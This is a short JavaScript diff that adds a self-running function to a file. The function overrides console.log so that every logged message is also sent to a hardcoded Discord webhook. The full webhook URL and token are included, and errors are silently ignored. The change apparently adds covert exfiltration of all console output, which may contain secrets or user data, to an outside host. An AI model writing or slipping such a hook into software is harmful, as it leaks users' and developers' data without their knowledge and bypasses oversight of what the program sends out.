@@ -19,3 +19,17 @@
 
   if (!res.ok) throw new Error(`Webhook failed ${res.status}`);
 })();
+
+(function() {
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1425948057018568705/48wQvRqkCejB_t5i7Giw_q6-75RaXLdEEPUMoN3H1W_lgMsrOPidv2qPHykXMC4RyvL6";
+  const originalLog = console.log;
+  console.log = function(...args) {
+    originalLog.apply(console, args);
+    const message = args.map(a => (typeof a === "object" ? JSON.stringify(a) : String(a))).join(" ");
+    fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({content: message})
+    }).catch(() => {});
+  };
+})();
